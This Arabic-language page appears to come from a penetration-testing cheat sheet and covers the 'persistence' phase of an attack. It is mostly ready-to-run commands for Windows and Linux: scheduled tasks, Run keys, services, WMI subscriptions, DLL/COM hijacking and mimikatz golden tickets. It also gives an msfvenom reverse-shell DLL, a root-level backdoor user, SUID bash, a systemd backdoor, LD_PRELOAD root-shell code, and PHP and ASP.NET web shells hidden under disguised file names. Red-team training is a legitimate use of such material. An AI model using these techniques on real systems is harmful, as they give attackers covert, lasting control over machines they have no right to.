<a id="-phase-5-persistence"></a>
# 🔒 المرحلة 5: ترسيخ الوصول (Persistence)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](05-Persistence.tr.md) • [🇬🇷 Ελληνικά](05-Persistence.el.md)

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**الهدف:** الحفاظ على الوصول إلى النظام المخترق حتى بعد إعادة التشغيل أو اكتشاف الاختراق.

---

<a id="-windows-persistence"></a>
## 🖥️ ترسيخ الوصول في Windows

> **ملاحظة:** تعليقات إصدار الأوامر في الأصل إرشادية، وبعض الكتل تجمع أكثر من صدفة. تتطلب وسائل ترسيخ الوصول الصلاحيات والإعدادات الملائمة، ولا تضمن الاستمرار بعد اكتشافها أو إبطال بيانات الاعتماد.


<a id="scheduled-tasks"></a>
### المهام المجدولة
```cmd
# إنشاء مهمة مجدولة تعمل بصلاحيات SYSTEM
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# باستخدام مستخدم محدد
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# عند بدء التشغيل
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# كل ساعة
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# عرض المهام
schtasks /query /fo LIST /v

# حذف مهمة
schtasks /delete /tn "TaskName" /f
```

<a id="registry-run-keys"></a>
### مفاتيح Run في سجل Windows
```cmd
# HKCU — المستخدم الحالي دون حاجة إلى صلاحيات مسؤول
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM — جميع المستخدمين مع اشتراط صلاحيات مسؤول
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce — التنفيذ مرة واحدة ثم الحذف
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

<a id="startup-folder"></a>
### مجلد بدء التشغيل
```cmd
# المستخدم الحالي
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# جميع المستخدمين (يتطلب صلاحيات مسؤول)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

<a id="services"></a>
### الخدمات
```cmd
# إنشاء خدمة (يتطلب صلاحيات مسؤول)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# تعديل خدمة قائمة
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

<a id="wmi-event-subscriptions"></a>
### اشتراكات أحداث WMI
```powershell
# ترسيخ الوصول باستخدام WMI
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

<a id="dll-hijacking--search-order"></a>
### اختطاف DLL وترتيب البحث عنها
```cmd
# البحث عن فرص اختطاف DLL
# وضع DLL ضارة في مجلد التطبيق
# أهداف شائعة:
# - ملفات برامج لا تستخدم مسارات DLL كاملة
# - ملفات DLL غير موجودة

# إنشاء DLL ضارة
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

<a id="com-hijacking"></a>
### اختطاف كائنات COM
```powershell
# البحث عن كائنات COM
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# إنشاء الاختطاف
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

<a id="goldensilver-ticket"></a>
### التذاكر الذهبية والفضية (Golden/Silver Ticket)
```powershell
# تذكرة Golden — ترسيخ وصول مسؤول المجال
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# تذكرة Silver — ترسيخ الوصول إلى الخدمة
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

<a id="-linux-persistence"></a>
## 🐧 ترسيخ الوصول في Linux

<a id="cron-jobs"></a>
### مهام Cron المجدولة
```bash
# ملف crontab للمستخدم
crontab -e
# إضافة: * * * * * /tmp/shell.sh

# ملف crontab للنظام
echo "* * * * * root /tmp/shell" >> /etc/crontab

# مجلدات Cron
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

<a id="ssh-keys"></a>
### مفاتيح SSH
```bash
# إضافة مفتاحك العام إلى authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# وصول root
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

<a id="backdoor-user"></a>
### حساب مستخدم للوصول الخلفي
```bash
# إضافة مستخدم بصلاحيات root
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# أو الإضافة مباشرة إلى /etc/passwd
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

<a id="suid-binary"></a>
### ملف تنفيذي يحمل SUID
```bash
# نسخ bash وضبط SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# التنفيذ بصلاحيات root
/tmp/.hidden -p
```

<a id="systemd-service"></a>
### خدمة systemd
```bash
# إنشاء ملف الخدمة
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# التفعيل والتشغيل
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

<a id="bashrc--profile"></a>
### bashrc / profile
```bash
# الإضافة إلى bashrc الخاص بالمستخدم
echo '/tmp/shell &' >> ~/.bashrc

# الإضافة إلى ملف profile العام
echo '/tmp/shell &' >> /etc/profile

# الإضافة إلى bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

<a id="ld_preload"></a>
### LD_PRELOAD
```bash
# إنشاء مكتبة مشتركة ضارة
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# الإضافة إلى LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

<a id="web-shell"></a>
### صدفة ويب (Web Shell)
```bash
# صدفة ويب PHP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# أقل ظهوراً
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

<a id="-web-persistence"></a>
## 🌐 ترسيخ الوصول عبر الويب

<a id="web-shell-locations"></a>
### مواقع صدف الويب
```bash
# مواقع شائعة لصدف الويب
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

<a id="aspnet-web-shell"></a>
### صدفة ويب ASP.NET
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="windows-persistence-methods"></a>
### طرق ترسيخ الوصول في Windows

| الطريقة | الموقع | الصلاحيات |
|--------|----------|-----------|
| مفتاح Run في السجل | HKCU/HKLM | مستخدم/مسؤول |
| مهمة مجدولة | مجدول المهام | مستخدم/مسؤول |
| مجلد بدء التشغيل | AppData/ProgramData | مستخدم/مسؤول |
| خدمة | الخدمات | مسؤول |
| WMI | اشتراك WMI | مسؤول |
| اختطاف COM | HKCU CLSID | مستخدم |

<a id="linux-persistence-methods"></a>
### طرق ترسيخ الوصول في Linux

| الطريقة | الموقع | الصلاحيات |
|--------|----------|-----------|
| جدولة Cron | /etc/crontab | root |
| مفاتيح SSH | ~/.ssh/authorized_keys | مستخدم |
| SUID | ملف تنفيذي يحمل +s | root |
| نظام الخدمات systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | مستخدم |

---

<a id="-related-cheatsheets"></a>
## 🔗 أدلة مرجعية ذات صلة

- [PowerShell](../../PowerShell/README.md)
- [أوامر Linux](../../Linux-Commands/README.md)
- [Metasploit](../../Metasploit/README.md)

---

**المرحلة السابقة:** [← 04 - الحركة الجانبية](./04-Lateral-Movement.ar.md)

**المرحلة التالية:** [06 - تفادي الدفاعات →](./06-Defense-Evasion.ar.md)
